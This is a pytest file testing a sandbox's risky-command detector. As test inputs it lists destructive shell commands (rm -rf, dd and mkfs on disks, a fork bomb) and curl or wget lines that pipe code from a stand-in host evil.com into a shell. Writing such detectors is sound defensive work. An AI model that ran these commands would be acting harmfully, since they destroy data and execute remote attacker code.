"""Tests for risk detection module."""

import pytest

from ua.sandbox.risk_detection import is_risky_command


class TestRmRfFlaggedAsRisky:
    """Tests for rm -rf pattern detection."""

    def test_rm_rf_flagged_as_risky(self):
        """rm -rf commands are flagged as risky."""
        risky, reason = is_risky_command("rm -rf /tmp/foo")
        assert risky is True
        assert "rm -rf" in reason.lower() or "recursive" in reason.lower()

    def test_rm_fr_flagged_as_risky(self):
        """rm -fr commands are flagged as risky."""
        risky, reason = is_risky_command("rm -fr /tmp/bar")
        assert risky is True

    def test_rm_r_f_flagged_as_risky(self):
        """rm -r -f commands are flagged as risky."""
        risky, reason = is_risky_command("rm -r -f /tmp/baz")
        assert risky is True

    def test_rm_f_r_flagged_as_risky(self):
        """rm -f -r commands are flagged as risky."""
        risky, reason = is_risky_command("rm -f -r /tmp/qux")
        assert risky is True


class TestSudoFlaggedAsRisky:
    """Tests for sudo pattern detection."""

    def test_sudo_flagged_as_risky(self):
        """sudo commands are flagged as risky."""
        risky, reason = is_risky_command("sudo apt install foo")
        assert risky is True
        assert "sudo" in reason.lower()

    def test_sudo_rm_combined_flagged(self):
        """sudo rm -rf is flagged."""
        risky, reason = is_risky_command("sudo rm -rf /tmp/x")
        assert risky is True


class TestDdFlaggedAsRisky:
    """Tests for dd pattern detection."""

    def test_dd_flagged_as_risky(self):
        """dd commands are flagged as risky."""
        risky, reason = is_risky_command("dd if=/dev/zero of=/dev/sda")
        assert risky is True
        assert "dd" in reason.lower() or "disk" in reason.lower()


class TestMkfsFlaggedAsRisky:
    """Tests for mkfs pattern detection."""

    def test_mkfs_flagged_as_risky(self):
        """mkfs commands are flagged as risky."""
        risky, reason = is_risky_command("mkfs.ext4 /dev/sda1")
        assert risky is True
        assert "mkfs" in reason.lower() or "filesystem" in reason.lower()


class TestForkBombFlaggedAsRisky:
    """Tests for fork bomb pattern detection."""

    def test_fork_bomb_flagged_as_risky(self):
        """Fork bomb pattern is flagged as risky."""
        risky, reason = is_risky_command(":(){:|:&};:")
        assert risky is True
        assert "fork bomb" in reason.lower()


class TestCurlPipeBashFlaggedAsRisky:
    """Tests for curl pipe to shell pattern detection."""

    def test_curl_pipe_bash_flagged_as_risky(self):
        """curl | bash is flagged as risky."""
        risky, reason = is_risky_command("curl http://evil.com/x | bash")
        assert risky is True

    def test_curl_pipe_sh_flagged_as_risky(self):
        """curl | sh is flagged as risky."""
        risky, reason = is_risky_command("curl http://evil.com/x | sh")
        assert risky is True

    def test_wget_pipe_sh_flagged_as_risky(self):
        """wget | sh is flagged as risky."""
        risky, reason = is_risky_command("wget http://evil.com/x | sh")
        assert risky is True


class TestGitForcePushFlaggedAsRisky:
    """Tests for git push --force pattern detection."""

    def test_git_force_push_flagged_as_risky(self):
        """git push -f is flagged as risky."""
        risky, reason = is_risky_command("git push origin main -f")
        assert risky is True
        assert "force" in reason.lower()

    def test_git_push_force_flagged_as_risky(self):
        """git push --force is flagged as risky."""
        risky, reason = is_risky_command("git push origin main --force")
        assert risky is True
        assert "force" in reason.lower()


class TestBenignCommandsNotFlagged:
    """Tests that benign commands are not flagged."""

    @pytest.mark.parametrize(
        "command",
        [
            "ls",
            "pytest",
            "python script.py",
            "git status",
            "pip install requests",
            "cat file.txt",
            "echo hello",
            "ls -la",
            "npm install",
            "yarn build",
        ],
    )
    def test_benign_commands_not_flagged(self, command):
        """Benign commands are not flagged as risky."""
        risky, reason = is_risky_command(command)
        assert risky is False
        assert reason == ""


class TestCaseInsensitiveMatching:
    """Tests for case-insensitive pattern matching."""

    def test_case_insensitive_matching_sudo(self):
        """SUDO rm -rf is still flagged."""
        risky, reason = is_risky_command("SUDO rm -rf /")
        assert risky is True

    def test_case_insensitive_matching_rm(self):
        """Mixed case RM command is still flagged."""
        risky, reason = is_risky_command("RM -RF /tmp/x")
        assert risky is True

    def test_case_insensitive_matching_dd(self):
        """Mixed case DD command is still flagged."""
        risky, reason = is_risky_command("DD if=/dev/zero")
        assert risky is True

    def test_case_insensitive_matching_mkfs(self):
        """Mixed case MKFS command is still flagged."""
        risky, reason = is_risky_command("MKFS.ext4 /dev/sda1")
        assert risky is True

    def test_case_insensitive_matching_curl(self):
        """Mixed case curl|bash is still flagged."""
        risky, reason = is_risky_command("CURL http://x | BASH")
        assert risky is True


class TestEdgeCases:
    """Tests for edge cases."""

    def test_empty_command_not_flagged(self):
        """Empty command is not flagged."""
        risky, reason = is_risky_command("")
        assert risky is False
        assert reason == ""

    def test_whitespace_only_not_flagged(self):
        """Whitespace-only command is not flagged."""
        risky, reason = is_risky_command("   ")
        assert risky is False
        assert reason == ""

    def test_shell_redirect_to_dev_flagged(self):
        """Redirect to /dev/ is flagged."""
        risky, reason = is_risky_command("echo foo > /dev/null")
        assert risky is True
        assert "block device" in reason.lower()

    def test_chmod_777_root_flagged(self):
        """chmod 777 on root path is flagged."""
        risky, reason = is_risky_command("chmod 777 /tmp/foo")
        assert risky is True

    def test_shutdown_flagged(self):
        """shutdown command is flagged."""
        risky, reason = is_risky_command("shutdown now")
        assert risky is True

    def test_reboot_flagged(self):
        """reboot command is flagged."""
        risky, reason = is_risky_command("reboot")
        assert risky is True

    def test_halt_flagged(self):
        """halt command is flagged."""
        risky, reason = is_risky_command("halt")
        assert risky is True
